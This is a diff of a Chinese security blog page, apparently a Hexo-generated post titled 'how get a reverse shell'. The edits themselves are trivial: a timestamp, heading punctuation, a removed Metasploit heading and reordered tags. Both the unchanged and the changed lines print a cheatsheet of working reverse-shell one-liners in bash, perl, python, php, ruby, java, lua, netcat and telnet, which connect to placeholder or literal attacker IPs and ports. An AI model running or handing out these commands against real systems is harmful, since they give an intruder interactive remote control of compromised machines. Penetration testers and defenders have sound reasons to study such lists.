@@ -16,7 +16,7 @@
 <meta property="og:site_name" content="owefsad&#39;s blog">
 <meta property="og:description" content="简介渗透测试过程中, 经常遇到WEB获取反弹shell、数据库获取反弹shell等场景, 本文记录诸位大佬们研究的反弹shell的技巧, 作为一个cheatsheet. 状态: 持续总结中">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-04-24T04:39:27.052Z">
+<meta property="og:updated_time" content="2019-04-24T05:10:14.764Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="how get a reverse shell">
 <meta name="twitter:description" content="简介渗透测试过程中, 经常遇到WEB获取反弹shell、数据库获取反弹shell等场景, 本文记录诸位大佬们研究的反弹shell的技巧, 作为一个cheatsheet. 状态: 持续总结中">
@@ -209,20 +209,20 @@
 <li>linux下创建反弹shell</li>
 </ul>
 <h4 id="linux下反弹shell"><a href="#linux下反弹shell" class="headerlink" title="linux下反弹shell"></a>linux下反弹shell</h4><p>1.上传反弹文件（脚本、木马）</p>
-<p>2.bash：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bash -i &gt;&amp; /dev/tcp/&lt;Attackip&gt;/&lt;Attackport&gt; 0 &gt;&amp;1</span><br></pre></td></tr></table></figure></p>
+<p>2.bash<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bash -i &gt;&amp; /dev/tcp/&lt;Attackip&gt;/&lt;Attackport&gt; 0 &gt;&amp;1</span><br></pre></td></tr></table></figure></p>
 <p>该命令在渗透测试中占据榜首多年, 是反弹 shell的首选命令, 但是在一些系统中无法成功运行, 目前在centos下实测过可正常反弹shell.</p>
-<p>3.perl：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ perl -e <span class="string">'use Socket;$i="&lt;Attackip&gt;";$p=&lt;Attackport&gt;;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure></p>
+<p>3.perl<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ perl -e <span class="string">'use Socket;$i="&lt;Attackip&gt;";$p=&lt;Attackport&gt;;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure></p>
 <p>perl是linux系统中内置的解释器, 当bash命令无法反弹shell时, 优先选择该命令</p>
-<p>4.python：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;Attackip&gt;",&lt;Attackport&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure></p>
-<p>5.php：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ php -r <span class="string">'$sock=fsockopen("&lt;Attackip&gt;",&lt;Attackport&gt;);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure></p>
-<p>6.ruby：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ruby -rsocket -e<span class="string">'f=TCPSocket.open("&lt;Attackip&gt;",&lt;Attackport&gt;).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></span><br></pre></td></tr></table></figure></p>
+<p>4.python<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;Attackip&gt;",&lt;Attackport&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure></p>
+<p>5.php<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ php -r <span class="string">'$sock=fsockopen("&lt;Attackip&gt;",&lt;Attackport&gt;);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure></p>
+<p>6.ruby<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ruby -rsocket -e<span class="string">'f=TCPSocket.open("&lt;Attackip&gt;",&lt;Attackport&gt;).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></span><br></pre></td></tr></table></figure></p>
 <p>7.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure></p>
 <p>8.Lua：<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e <span class="string">"require('socket');require('os');t=socket.tcp();t:connect('&lt;Attackip&gt;','&lt;Attackport&gt;');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></span><br></pre></td></tr></table></figure></p>
 <p>9.nc：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh &lt;Attackip&gt; &lt;Attackport&gt;</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;Attackip&gt; &lt;Attackport&gt; &gt;/tmp/f</span><br><span class="line">nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999</span><br></pre></td></tr></table></figure></p>
 <p>10.nc<br>1) 使用-e参数<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
 <p>2) 不使用-e参数<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Victim</span></span><br><span class="line">mknod /tmp/backpipe p</span><br><span class="line"></span><br><span class="line"><span class="comment"># Victim</span></span><br><span class="line">/bin/sh 0&lt;/tmp/backpipe | nc attackerip listenport 1&gt;/tmp/backpipe</span><br></pre></td></tr></table></figure></p>
 <p>11.telnet<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br><span class="line">telnet 173.214.173.151 8080 | /bin/bash | telnet 173.214.173.151 8888</span><br></pre></td></tr></table></figure></p>
-<h2 id="Metasploit创建反弹shell"><a href="#Metasploit创建反弹shell" class="headerlink" title="Metasploit创建反弹shell"></a>Metasploit创建反弹shell</h2>
+
       
 
       
@@ -298,7 +298,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#文章目录"><span class="toc-number">1.</span> <span class="toc-text">文章目录</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#linux下反弹shell"><span class="toc-number">1.0.1.</span> <span class="toc-text">linux下反弹shell</span></a></li></ol></li></ol><li class="toc-item toc-level-2"><a class="toc-link" href="#Metasploit创建反弹shell"><span class="toc-number">2.</span> <span class="toc-text">Metasploit创建反弹shell</span></a></li>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#文章目录"><span class="toc-number">1.</span> <span class="toc-text">文章目录</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#linux下反弹shell"><span class="toc-number">1.0.1.</span> <span class="toc-text">linux下反弹shell</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
@@ -460,11 +460,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">cheatsheet</a>
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">python</a>
+                <a href="javascript:void(0)" class="js-tag color1">cheatsheet</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -496,10 +496,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">reverse_rbash</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">jenkins</a>
               </li>
              
@@ -508,7 +504,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">reverse_rbash</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">wmi</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">甲方安全</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">防御方案</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -520,11 +528,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">甲方安全</a>
+                <a href="javascript:void(0)" class="js-tag color4">rce</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">防御方案</a>
+                <a href="javascript:void(0)" class="js-tag color3">sandbox</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -540,14 +548,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">rce</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">sandbox</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">waf</a>
               </li>
              
@@ -556,27 +556,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">services</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">cheetsheet</a>
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">services</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">fuzz</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">node_rce</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">序列化与反序列化</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">ss-manager</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -589,6 +577,18 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">设计模式</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">node_rce</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">序列化与反序列化</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">ss-manager</a>
               </li>
              
               <li class="article-tag-list-item">
